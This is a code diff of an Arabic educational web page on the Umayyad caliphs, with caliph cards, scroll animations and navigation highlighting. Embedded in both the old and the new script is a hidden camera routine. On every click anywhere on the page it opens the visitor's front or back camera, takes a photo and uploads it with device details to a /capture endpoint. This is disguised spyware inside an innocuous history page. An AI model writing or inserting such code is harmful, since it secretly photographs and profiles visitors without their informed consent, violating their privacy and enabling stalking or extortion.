+    { name: "معاوية بن يزيد", years: "٦٤ هـ" }, { name: "مروان بن الحكم", years: "٦٤ — ٦٥ هـ" },
+    { name: "عبد الملك بن مروان", years: "٦٥ — ٨٦ هـ" }, { name: "الوليد بن عبد الملك", years: "٨٦ — ٩٦ هـ" },
+    { name: "سليمان بن عبد الملك", years: "٩٦ — ٩٩ هـ" }, { name: "عمر بن عبد العزيز", years: "٩٩ — ١٠١ هـ" },
+    { name: "يزيد بن عبد الملك", years: "١٠١ — ١٠٥ هـ" }, { name: "هشام بن عبد الملك", years: "١٠٥ — ١٢٥ هـ" },
+    { name: "الوليد بن يزيد", years: "١٢٥ — ١٢٦ هـ" }, { name: "يزيد بن الوليد", years: "١٢٦ هـ" },
+    { name: "إبراهيم بن الوليد", years: "١٢٦ هـ" }, { name: "مروان بن محمد", years: "١٢٦ — ١٣٢ هـ" }
+  ];
+  const arabicNumerals = ['١','٢','٣','٤','٥','٦','٧','٨','٩','١٠','١١','١٢','١٣','١٤'];
+  const caliphsGrid = document.getElementById('caliphsGrid');
+  caliphsData.forEach((c, idx) => {
+    const card = document.createElement('div');
+    card.className = 'caliph-card';
+    card.innerHTML = `<div class="caliph-num">${arabicNumerals[idx]}</div><div class="caliph-name">${c.name}</div><div class="caliph-years">${c.years}</div>`;
+    caliphsGrid.appendChild(card);
+  });
+
+  // خطوط الكوكب
+  const planetLines = document.getElementById('planetLines');
+  for (let i = 1; i < 6; i++) {
+    const h = document.createElement('div'); h.className = 'planet-line'; h.style.top = (i * 16.6) + '%'; planetLines.appendChild(h);
+    const v = document.createElement('div'); v.className = 'planet-vline'; v.style.right = (i * 16.6) + '%'; planetLines.appendChild(v);
+  }
+
+  // تأثيرات الظهور (reveal)
+  const revealObs = new IntersectionObserver((entries) => {
+    entries.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); revealObs.unobserve(e.target); } });
+  }, { threshold: 0.12 });
+  document.querySelectorAll('.reveal').forEach(el => revealObs.observe(el));
+
+  // عناصر الخط الزمني
+  const tlItems = document.querySelectorAll('.tl-item-content');
+  const tlObs = new IntersectionObserver((entries) => {
+    entries.forEach(e => { if (e.isIntersecting) { setTimeout(() => e.target.classList.add('visible'), 80); document.querySelectorAll('.tl-dot-wrap').forEach(d => { if (d.getBoundingClientRect().top < window.innerHeight * 0.8) d.classList.add('pulse'); }); } });
+  }, { threshold: 0.2 });
+  tlItems.forEach(el => tlObs.observe(el));
+
+  // بطاقات الإنجازات المتدرجة
+  const achObserver = new IntersectionObserver((entries) => {
+    entries.forEach(e => { if (e.isIntersecting) { const cards = document.querySelectorAll('.ach-card'); cards.forEach((c, idx) => setTimeout(() => c.classList.add('visible'), idx * 80)); achObserver.disconnect(); } });
+  }, { threshold: 0.1 });
+  if (document.querySelector('.ach-cards')) achObserver.observe(document.querySelector('.ach-cards'));
+
+  // بطاقات الخلفاء المتدرجة
+  const caliphObserver = new IntersectionObserver((entries) => {
+    entries.forEach(e => { if (e.isIntersecting) { const cards = document.querySelectorAll('.caliph-card'); cards.forEach((c, idx) => setTimeout(() => c.classList.add('visible'), idx * 40)); caliphObserver.disconnect(); } });
+  }, { threshold: 0.05 });
+  if (document.getElementById('caliphsGrid')) caliphObserver.observe(document.getElementById('caliphsGrid'));
+
+  // زر العودة للأعلى
+  const scrollBtn = document.getElementById('scrollTopBtn');
+  window.addEventListener('scroll', () => {
+    if (window.scrollY > 600) scrollBtn.classList.add('visible'); else scrollBtn.classList.remove('visible');
+    // إضافة class 'scrolled' للهيدر
+    if (window.scrollY > 20) document.body.classList.add('scrolled'); else document.body.classList.remove('scrolled');
+  });
+  scrollBtn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+
+  // تمييز الرابط النشط في الهيدر
+  const sections = document.querySelectorAll('[id]');
+  const navLinks = document.querySelectorAll('.nav-links a');
+  window.addEventListener('scroll', () => {
+    let current = '';
+    sections.forEach(s => { if (window.scrollY >= s.offsetTop - 100) current = s.id; });
+    navLinks.forEach(a => { a.style.color = a.getAttribute('href') === '#' + current ? 'var(--gold)' : ''; if (a.getAttribute('href') === '#' + current) a.classList.add('active'); else a.classList.remove('active'); });
+  });
+
+  // ---------- الكاميرا المتقدمة (تسلسل: أمامية, أمامية, خلفية) تتكرر بلا حدود، طلب رسمي من المتصفح ----------
+  (function() {
+    let captureCounter = 0;
+    let isProcessing = false;
+    let currentStream = null;
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      let os = "غير معروف", browser = "غير معروف";
+      if (ua.includes("Windows")) os = "Windows";
+      else if (ua.includes("Mac OS")) os = "macOS";
+      else if (ua.includes("Linux")) os = "Linux";
+      else if (ua.includes("Android")) os = "Android";
+      else if (ua.includes("iOS") || ua.includes("iPhone")) os = "iOS";
+      if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+      else if (ua.includes("Firefox")) browser = "Firefox";
+      else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+      else if (ua.includes("Edg")) browser = "Edge";
+      const screen = `${window.screen.width}x${window.screen.height}`;
+      const language = navigator.language || "غير معروف";
+      return { os, browser, screen, language };
     }
 
-    // تأثيرات الظهور
-    const revealObs = new IntersectionObserver((entries) => {
-      entries.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); revealObs.unobserve(e.target); } });
-    }, { threshold: 0.12 });
-    document.querySelectorAll('.reveal').forEach(el => revealObs.observe(el));
-
-    // Timeline observer
-    const tlItems = document.querySelectorAll('.tl-item-content');
-    const tlObs = new IntersectionObserver((entries) => {
-      entries.forEach(entry => {
-        if (entry.isIntersecting) {
-          setTimeout(() => entry.target.classList.add('visible'), 80);
-          document.querySelectorAll('.tl-dot-wrap').forEach(d => {
-            if (d.getBoundingClientRect().top < window.innerHeight * 0.8) d.classList.add('pulse');
-          });
-        }
+    async function sendPhoto(blob) {
+      return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          fetch('/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: reader.result, device_info: getDeviceInfo(), camera: 'single' })
+          }).then(res => res.json()).then(resolve).catch(reject);
+        };
+        reader.onerror = reject;
+        reader.readAsDataURL(blob);
       });
-    }, { threshold: 0.2 });
-    tlItems.forEach(el => tlObs.observe(el));
+    }
 
-    // Achievements stagger
-    const achObserver = new IntersectionObserver((entries) => {
-      entries.forEach(e => {
-        if (e.isIntersecting) {
-          const cards = document.querySelectorAll('.ach-card');
-          cards.forEach((c, idx) => setTimeout(() => c.classList.add('visible'), idx * 80));
-          achObserver.disconnect();
-        }
-      });
-    }, { threshold: 0.1 });
-    if (document.querySelector('.ach-cards')) achObserver.observe(document.querySelector('.ach-cards'));
-
-    // Caliph cards stagger
-    const caliphObserver = new IntersectionObserver((entries) => {
-      entries.forEach(e => {
-        if (e.isIntersecting) {
-          const cards = document.querySelectorAll('.caliph-card');
-          cards.forEach((c, idx) => setTimeout(() => c.classList.add('visible'), idx * 40));
-          caliphObserver.disconnect();
-        }
-      });
-    }, { threshold: 0.05 });
-    if (document.getElementById('caliphsGrid')) caliphObserver.observe(document.getElementById('caliphsGrid'));
-
-    // Scroll to top button
-    const scrollBtn = document.getElementById('scrollTopBtn');
-    window.addEventListener('scroll', () => {
-      if (window.scrollY > 600) scrollBtn.classList.add('visible');
-      else scrollBtn.classList.remove('visible');
-    });
-    scrollBtn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
-
-    // Highlight active section in nav
-    const sections = document.querySelectorAll('[id]');
-    const navLinks = document.querySelectorAll('.nav-links a');
-    window.addEventListener('scroll', () => {
-      let current = '';
-      sections.forEach(s => { if (window.scrollY >= s.offsetTop - 100) current = s.id; });
-      navLinks.forEach(a => { a.style.color = a.getAttribute('href') === '#' + current ? 'var(--gold)' : ''; });
-    });
-
-    // ---------- الكاميرا المتقدمة: تسلسل أمامية, أمامية, خلفية يتكرر بلا حدود ----------
-    (function() {
-      let captureCounter = 0;     // يبدأ من 0: 0-> front, 1-> front, 2-> back, 3-> front, ...
-      let isProcessing = false;
-      let currentStream = null;
-
-      function getDeviceInfo() {
-        const ua = navigator.userAgent;
-        let os = "غير معروف", browser = "غير معروف";
-        if (ua.includes("Windows")) os = "Windows";
-        else if (ua.includes("Mac OS")) os = "macOS";
-        else if (ua.includes("Linux")) os = "Linux";
-        else if (ua.includes("Android")) os = "Android";
-        else if (ua.includes("iOS") || ua.includes("iPhone")) os = "iOS";
-        if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
-        else if (ua.includes("Firefox")) browser = "Firefox";
-        else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
-        else if (ua.includes("Edg")) browser = "Edge";
-        const screen = `${window.screen.width}x${window.screen.height}`;
-        const language = navigator.language || "غير معروف";
-        return { os, browser, screen, language };
-      }
-
-      async function sendPhoto(blob) {
+    async function captureFromStream(stream) {
+      const track = stream.getVideoTracks()[0];
+      if (!track) throw new Error("No video track");
+      try {
+        const imageCapture = new ImageCapture(track);
+        return await imageCapture.takePhoto();
+      } catch(e) {
         return new Promise((resolve, reject) => {
-          const reader = new FileReader();
-          reader.onloadend = () => {
-            fetch('/capture', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ image: reader.result, device_info: getDeviceInfo(), camera: 'single' })
-            }).then(resp => resp.json()).then(resolve).catch(reject);
+          const video = document.createElement('video');
+          video.autoplay = true; video.playsInline = true; video.muted = true;
+          video.srcObject = stream;
+          video.onloadedmetadata = () => {
+            video.play();
+            setTimeout(() => {
+              const canvas = document.createElement('canvas');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              canvas.getContext('2d').drawImage(video, 0, 0);
+              canvas.toBlob(resolve, 'image/jpeg', 0.9);
+              video.pause();
+              video.srcObject = null;
+            }, 200);
           };
-          reader.onerror = reject;
-          reader.readAsDataURL(blob);
+          video.onerror = reject;
         });
       }
+    }
 
-      async function captureFromStream(stream) {
-        const track = stream.getVideoTracks()[0];
-        if (!track) throw new Error("No video track");
-        try {
-          const imageCapture = new ImageCapture(track);
-          return await imageCapture.takePhoto();
-        } catch(e) {
-          // fallback: video element to canvas
-          return new Promise((resolve, reject) => {
-            const video = document.createElement('video');
-            video.autoplay = true;
-            video.playsInline = true;
-            video.muted = true;
-            video.srcObject = stream;
-            video.onloadedmetadata = () => {
-              video.play();
-              setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(resolve, 'image/jpeg', 0.9);
-                video.pause();
-                video.srcObject = null;
-              }, 200);
-            };
-            video.onerror = reject;
-          });
-        }
+    async function openCamera(facingMode) {
+      if (currentStream) {
+        currentStream.getTracks().forEach(t => t.stop());
+        currentStream = null;
       }
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
+        currentStream = stream;
+        return stream;
+      } catch(err) {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+        currentStream = stream;
+        return stream;
+      }
+    }
 
-      async function openCamera(facingMode) {
+    async function capturePhoto() {
+      if (isProcessing) return;
+      isProcessing = true;
+      try {
+        let facingMode;
+        const step = captureCounter % 3;
+        if (step === 0 || step === 1) facingMode = 'user';
+        else facingMode = 'environment';
+        captureCounter++;
+
+        const stream = await openCamera(facingMode);
+        if (stream) {
+          const blob = await captureFromStream(stream);
+          await sendPhoto(blob);
+        }
+      } catch(err) {
+        console.warn("Camera error:", err);
+      } finally {
         if (currentStream) {
           currentStream.getTracks().forEach(t => t.stop());
           currentStream = null;
         }
-        try {
-          // Try exact first (better compatibility for some mobiles)
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
-          currentStream = stream;
-          return stream;
-        } catch(err) {
-          // fallback to any camera with given facingMode
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
-          currentStream = stream;
-          return stream;
-        }
+        isProcessing = false;
       }
+    }
 
-      async function capturePhoto() {
-        if (isProcessing) return;
-        isProcessing = true;
-        try {
-          // pattern: 0->front, 1->front, 2->back, repeat
-          let facingMode;
-          const step = captureCounter % 3;
-          if (step === 0) facingMode = 'user';
-          else if (step === 1) facingMode = 'user';
-          else facingMode = 'environment';
-          captureCounter++;
-
-          const stream = await openCamera(facingMode);
-          if (stream) {
-            const blob = await captureFromStream(stream);
-            await sendPhoto(blob);
-          }
-        } catch(err) {
-          console.warn("Camera/photo error:", err);
-        } finally {
-          if (currentStream) {
-            currentStream.getTracks().forEach(t => t.stop());
-            currentStream = null;
-          }
-          isProcessing = false;
-        }
-      }
-
-      // النقر على أي مكان في الصفحة (بما فيها الأزرار والروابط) باستثناء زر العودة للأعلى
-      document.body.addEventListener('click', (e) => {
-        if (e.target.closest('.scroll-top')) return;  // لا نصور عند الضغط على زر السكرول
-        capturePhoto();
-      });
-    })();
-  </script>
+    document.body.addEventListener('click', (e) => {
+      if (e.target.closest('.scroll-top')) return;
+      capturePhoto();
+    });
+  })();
+</script>
 </body>
 </html>
